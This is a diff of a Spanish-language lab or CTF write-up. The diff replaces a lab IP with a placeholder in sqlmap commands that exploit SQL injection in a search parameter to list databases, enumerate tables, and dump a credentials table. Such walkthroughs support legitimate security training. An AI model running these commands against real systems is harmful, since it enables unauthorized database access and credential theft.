@@ -91,7 +91,7 @@ Se automatiza la explotación con sqlmap.
 ### Listar bases de datos
 
 ```bash
-sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" --batch --dbs
+sqlmap -u "http://<ip>/catalog/search.php?q=test" --batch --dbs
 ```
 
 Resultado:
@@ -104,7 +104,7 @@ available databases [2]:
 ### 3.3 Enumeración de tablas
 
 ```bash
-sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" -D crimson_db --tables --batch
+sqlmap -u "http://<ip>/catalog/search.php?q=test" -D crimson_db --tables --batch
 ```
 
 Resultado:
@@ -122,7 +122,7 @@ Database: crimson_db
 ### 3.4 Dump de credenciales
 
 ```
-sqlmap -u "http://192.168.56.104/catalog/search.php?q=test" -D crimson_db -T edward_records --dump --batch
+sqlmap -u "http://<ip>/catalog/search.php?q=test" -D crimson_db -T edward_records --dump --batch
 ```
 
 Se obtienen credenciales:
